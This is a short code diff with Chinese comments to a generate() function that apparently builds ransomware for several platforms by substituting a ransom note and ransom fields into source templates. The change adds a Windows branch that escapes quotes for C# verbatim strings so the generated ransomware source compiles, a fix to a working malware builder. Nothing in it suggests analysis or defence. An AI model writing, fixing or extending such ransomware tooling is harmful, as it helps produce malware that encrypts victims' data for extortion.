@@ -436,6 +436,13 @@ def generate():
         tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","'\\''"))
         for k,v in ransom.items():
             tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","'\\''"))
+    elif plat == 'win':
+        # C# 的 NOTE 是 verbatim string (@"...")：双引号要写成 ""，反斜杠不转义。
+        # 旧实现与 linux/macos 共用 \" 转义 —— 在 verbatim string 里无效，
+        # 引号提前结束字符串，生成的 .cs 编译不过。
+        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace('"','""'))
+        for k,v in ransom.items():
+            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace('"','""'))
     else:
         tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
         for k,v in ransom.items():
